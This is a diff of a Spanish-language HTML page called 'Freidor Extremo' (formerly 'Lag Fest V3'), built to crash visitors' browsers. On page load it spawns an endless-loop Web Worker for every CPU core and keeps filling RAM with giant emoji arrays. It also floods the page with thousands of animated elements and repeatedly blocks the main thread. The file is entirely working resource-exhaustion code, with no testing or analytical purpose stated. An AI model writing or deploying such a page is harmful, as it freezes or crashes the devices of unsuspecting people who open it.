@@ -1,79 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-  <title>Lag Fest V3 🔥</title>
+  <meta charset="UTF-8" />
+  <title>Freidor Extremo 🔥</title>
   <style>
     body {
-      background: black;
-      color: white;
+      margin: 0; padding: 0; background: black; color: white;
       font-family: monospace;
       overflow: hidden;
     }
-    .box {
-      width: 100px;
-      height: 100px;
-      background-color: red;
+    .pixel {
       position: absolute;
-      animation: spin 0.2s linear infinite;
+      width: 5px;
+      height: 5px;
+      background: rgb(255,0,0);
+      animation: pixelSpin 0.4s linear infinite;
     }
-    @keyframes spin {
-      from { transform: rotate(0deg) scale(1); }
-      to { transform: rotate(360deg) scale(3); }
+    @keyframes pixelSpin {
+      0% {transform: rotate(0deg) scale(1);}
+      50% {transform: rotate(180deg) scale(2);}
+      100% {transform: rotate(360deg) scale(1);}
     }
   </style>
 </head>
 <body>
-  <h1>🔥 Invocando el lag... 🔥</h1>
+  <h1 style="position: fixed; top: 10px; left: 10px; z-index: 9999;">
+    🔥 Freidor Ultra - ¡Prepárate para el meltdown! 🔥
+  </h1>
   <script>
-    // CPU STRESS (hilos infinitos)
-    function stressCPU() {
-      for (let i = 0; i < 16; i++) {
-        setTimeout(() => {
-          while (true) {
-            let x = Math.pow(Math.random(), Math.random());
+    // CPU ultra stress con workers infinitos
+    const workerCode = () => {
+      onmessage = () => {
+        while (true) {
+          // Cálculo intenso que no para nunca
+          let x = 0;
+          for(let i=0; i<1e7; i++) {
+            x += Math.sqrt(Math.random()*i);
           }
-        }, 10);
-      }
-    }
-
-    // RAM STRESS (cadenas basura)
-    function stressRAM() {
-      let ramArray = [];
-      for (let i = 0; i < 5000; i++) {
-        ramArray.push(new Array(1000000).fill("🧠".repeat(100)));
-      }
-    }
-
-    // DOM & GPU STRESS (cajas animadas infinitas)
-    function stressDOMandGPU() {
-      setInterval(() => {
-        for (let i = 0; i < 500; i++) {
-          let div = document.createElement("div");
-          div.className = "box";
-          div.style.left = Math.random() * window.innerWidth + "px";
-          div.style.top = Math.random() * window.innerHeight + "px";
-          document.body.appendChild(div);
         }
-      }, 300); // Repite y repite
+      }
+    };
+
+    const workerBlob = new Blob(['(' + workerCode.toString() + ')()'], {type: 'application/javascript'});
+    const workerURL = URL.createObjectURL(workerBlob);
+
+    const workers = [];
+    const WORKER_COUNT = navigator.hardwareConcurrency || 8;
+
+    for(let i=0; i < WORKER_COUNT; i++){
+      const w = new Worker(workerURL);
+      w.postMessage('start');
+      workers.push(w);
     }
 
-    // EVENT LOOP BLOCKER
-    function blockEventLoop() {
+    // RAM stress
+    const ramLoad = [];
+    function ramFiller() {
+      for(let i=0; i<10000; i++){
+        ramLoad.push(new Array(1000000).fill('🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥'));
+      }
+      setTimeout(ramFiller, 3000);
+    }
+    ramFiller();
+
+    // DOM + GPU stress
+    function createPixels() {
+      for(let i=0; i<2000; i++){
+        const pixel = document.createElement('div');
+        pixel.classList.add('pixel');
+        pixel.style.left = Math.random() * window.innerWidth + 'px';
+        pixel.style.top = Math.random() * window.innerHeight + 'px';
+        pixel.style.background = `rgb(${Math.random()*255},0,0)`;
+        document.body.appendChild(pixel);
+      }
+    }
+    createPixels();
+
+    // Event loop blocker
+    function blockLoop(){
       setInterval(() => {
-        const end = Date.now() + 2000;
-        while (Date.now() < end) {
-          // Nada más que bloquear el event loop
+        const end = Date.now() + 3000;
+        while(Date.now() < end) {
+          // Nada más bloquear el hilo principal
         }
       }, 5000);
     }
+    blockLoop();
 
-    // INICIAR TODO
-    window.onload = () => {
-      stressCPU();
-      setTimeout(stressRAM, 500);
-      setTimeout(stressDOMandGPU, 1000);
-      setTimeout(blockEventLoop, 2000);
-    };
   </script>
 </body>
 </html>
+
